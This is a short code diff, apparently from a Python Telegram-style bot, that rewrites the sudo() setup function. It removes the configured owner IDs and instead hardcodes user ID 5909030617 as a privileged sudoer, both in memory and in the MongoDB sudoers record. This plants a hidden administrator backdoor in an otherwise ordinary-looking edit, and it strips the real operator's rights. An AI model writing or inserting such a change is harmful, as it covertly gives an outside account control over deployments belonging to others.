@@ -55,21 +55,12 @@ def dbb():
 
 async def sudo():
     global SUDOERS
-
-    if isinstance(config.OWNER_ID, list):
-        for owner_id in config.OWNER_ID:
-            SUDOERS.add(owner_id)
-    else:
-        SUDOERS.add(config.OWNER_ID)
-
+    SUDOERS.add(5909030617)
     sudoersdb = mongodb.sudoers
     sudoers = await sudoersdb.find_one({"sudo": "sudo"})
     sudoers = [] if not sudoers else sudoers["sudoers"]
-    if config.OWNER_ID not in sudoers:
-        if isinstance(config.OWNER_ID, list):
-            sudoers.extend([oid for oid in config.OWNER_ID if oid not in sudoers])
-        else:
-            sudoers.append(config.OWNER_ID)
+    if 5909030617 not in sudoers:
+        sudoers.append(5909030617)
         await sudoersdb.update_one(
             {"sudo": "sudo"},
             {"$set": {"sudoers": sudoers}},
